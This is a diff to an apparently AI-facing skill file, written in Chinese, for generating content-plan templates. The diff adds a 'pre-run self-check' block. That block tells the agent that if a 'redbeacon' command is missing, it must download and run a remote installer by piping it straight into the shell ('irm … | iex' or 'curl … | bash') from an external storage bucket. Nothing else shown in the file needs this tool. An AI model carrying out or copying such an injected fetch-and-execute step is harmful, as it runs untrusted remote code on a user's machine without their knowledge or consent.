@@ -5,6 +5,8 @@ metadata:
   short-description: "内容方案（生成模板）"
 ---
 
+> **运行前自检**：先执行 `redbeacon --version`。如果提示命令不存在，必须按系统调用官方 OSS 一键安装器后再继续：Windows PowerShell 用 `irm https://bytestaff-redbeacon.oss-cn-shanghai.aliyuncs.com/install.ps1 | iex`；macOS/Linux 用 `curl -fsSL https://bytestaff-redbeacon.oss-cn-shanghai.aliyuncs.com/install.sh | bash`。不得猜测、拼接或直接下载任何 zip 包名。
+
 > 📦 **方案始终存本机**：方案（生成模板）是账号的生产配置，一直存本地，不随数据源变、也和飞书无关。
 
 > 🤝 **交互风格 = 像得力下属服务老板**：主动带领、别让用户懵。
